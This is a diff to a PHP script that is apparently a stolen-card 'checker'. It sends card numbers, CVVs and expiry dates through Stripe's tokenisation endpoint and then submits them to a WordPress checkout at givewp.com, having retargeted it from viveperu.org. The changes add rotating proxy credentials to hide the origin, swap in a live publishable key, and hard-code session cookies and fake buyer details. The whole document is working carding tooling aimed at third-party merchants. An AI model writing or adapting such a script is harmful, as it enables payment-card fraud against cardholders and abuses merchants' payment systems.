@@ -194,12 +194,16 @@ curl_close($ch);
 //=======================[Proxys]=============================//
 $rp1 = array(
   1 => 'iajaothu-rotate:sdk5p0j2bmae',
+  2 => 'iajaothu-rotate:sdk5p0j2bmae',
+  3 => 'ltekbahb-rotate:e0vds6xy7bkt',
+  4 => 'klwdhqgx-rotate:gptpwm4f7fp7',
     ); 
     $rpt = array_rand($rp1);
     $rotate = $rp1[$rpt];
 
 
 $ip = array(
+  1 => 'socks5://p.webshare.io:1080',
   2 => 'http://p.webshare.io:80',
     ); 
     $socks = array_rand($ip);
@@ -256,7 +260,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]='.$firstname.'+'.$lastname.'&billing_details[email]='.$email.'&billing_details[address][line1]='.$street.'&billing_details[address][line2]=&billing_details[address][city]='.$city.'&billing_details[address][state]='.$state.'&billing_details[address][postal_code]='.$postcode.'&billing_details[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=bf4c1bc5-5665-4671-9c99-1284dfee1a38273ec8&sid=807697c2-9532-4078-9a91-7f9cc72d9d0a4d1d4c&pasted_fields=number&payment_user_agent=stripe.js%2Fb9e9d8300%3B+stripe-js-v3%2Fb9e9d8300&time_on_page=658080&key=pk_live_SMtnnvlq4TpJelMdklNha8iD&_stripe_account=acct_1031hI2bmikBJrxj');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]='.$name.'+'.$last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fb9e9d8300%3B+stripe-js-v3%2Fb9e9d8300&time_on_page=365907&key=pk_live_iFZXNDKO9wZo9ZEDh8O85vLD00XfLKAjCf');
 
 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"'))); 
@@ -267,7 +271,7 @@ $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://www.viveperu.org/wp-admin/admin-ajax.php');
+curl_setopt($ch, CURLOPT_URL, 'https://givewp.com/wp-admin/admin-ajax.php');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -278,16 +282,16 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'authority: www.viveperu.org',
+'authority: givewp.com',
 'method: POST',
 'path: /wp-admin/admin-ajax.php',
 'scheme: https',
-'accept: application/json, text/plain, */*',
+'accept: application/json, text/javascript, */*; q=0.01',
 'accept-language: en-US,en;q=0.5',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: __stripe_mid=bf4c1bc5-5665-4671-9c99-1284dfee1a38273ec8; wp-give_session_5f36e31b0deaee977036bf5193ad2bed=90d4f2b01c25d3ae153c53cfd329ebf3%7C%7C1647335771%7C%7C1647332171%7C%7C8722d35a87bf414b4582fd9f18eb2efa; wp-give_session_reset_nonce_5f36e31b0deaee977036bf5193ad2bed=1; __stripe_sid=807697c2-9532-4078-9a91-7f9cc72d9d0a4d1d4c',
-'origin: https://www.viveperu.org',
-'referer: https://www.viveperu.org/donate-now/?form-id=204834&level-id=custom&custom-amount=1.00&payment-mode=stripe',
+'cookie: PHPSESSID=e703c5335145d2245514e6c62badbe0d; helpful_user=b2b04561b5d9d38f27a4627bf1af387d; prism_89920694=fb4c10ce-f9db-4491-8e9c-f9aed74ae9ec; _gcl_au=1.1.1085446356.1647278981; _hjSessionUser_2446469=eyJpZCI6IjJjYzNjOWU1LTE2OTgtNTMyOC1iZDc1LTEwZGQzNWRmYWVkYiIsImNyZWF0ZWQiOjE2NDcyNzg5ODE2OTIsImV4aXN0aW5nIjp0cnVlfQ==; _hjFirstSeen=1; _hjIncludedInSessionSample=0; _hjSession_2446469=eyJpZCI6IjcyM2JjMTgwLWNkNzEtNDVmMy1hYzMwLWU2MTIwMTQ2Mzk0MiIsImNyZWF0ZWQiOjE2NDcyNzg5ODE5NzEsImluU2FtcGxlIjpmYWxzZX0=; _hjIncludedInPageviewSample=1; _hjAbsoluteSessionInProgress=1; _ga_683GDCL9YD=GS1.1.1647278981.1.1.1647279331.0; _ga=GA1.2.1472811858.1647278982; _gid=GA1.2.185065330.1647278983; _fbp=fb.1.1647278985555.249401336; _clck=bdd8hc|1|ezr|0; _clsk=1xlad0b|1647279004649|2|1|h.clarity.ms/collect; edd_items_in_cart=1; _uetsid=5614b600a3bc11ec9e0541a3172935d1; _uetvid=561547e0a3bc11eca12633888a237dc9; wpf_guest=ydoaeure%40yahoo.com; edd_cart_token=86325a7ac7f11ffe629c749681756deb; _gat_UA-59629224-1=1',
+'origin: https://givewp.com',
+'referer: https://givewp.com/checkout/',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-origin',
@@ -297,7 +301,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'action=give_donation_form_reset_all_nonce&give_form_id=204834');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'action=edds_process_purchase_form&form_data=payment-mode%3Dstripe%26edd_action%3Dgateway_select%26page_id%3D110286%26edd_first%3Djhon%26edd_last%3Dldie%26edd_email%3Dydoaeure%2540yahoo.com%26edd_phone%3D2024051254%26card_name%3Djhon%2520dmke%26edd_action%3Dpurchase%26edd-gateway%3Dstripe%26edd-process-checkout-nonce%3D78340e175f&payment_method_id='.$id.'&payment_method_exists=false');
 
 
 $result2 = curl_exec($ch);
